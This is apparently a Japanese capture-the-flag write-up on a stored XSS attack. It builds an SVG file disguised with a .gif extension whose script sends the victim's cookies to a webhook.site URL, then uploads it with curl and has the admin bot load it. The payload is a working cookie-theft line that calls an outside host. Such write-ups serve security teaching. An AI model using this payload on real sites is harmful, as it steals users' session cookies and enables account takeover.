以下のように、スクリプトを仕組んだファイルを作成する(拡張子は`.gif`とする)。nanoやvimでやるとやりやすい。

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>window.location = 'https://webhook.site/[サイトのID]?c='+ encodeURIComponent(document.cookie); </script>
</svg>
```

次にそれをアップロードする。これは`curl`で行う。

```bash
curl -F "file=@xss_svg.gif;type=image/svg+xml" http://34.170.146.252:[ポート番号]/api/upload
```

成功すると以下のようなレスポンスが来る。

```
{"file_id":"[ファイルID]","success":true}
```

最後に、admin botで以下を入力するとWebhookにフラグが来る。

```
api/file/[ファイルID]
```

## 参考文献

https://toshiconner201.hatenablog.com/entry/2026/08/01/082012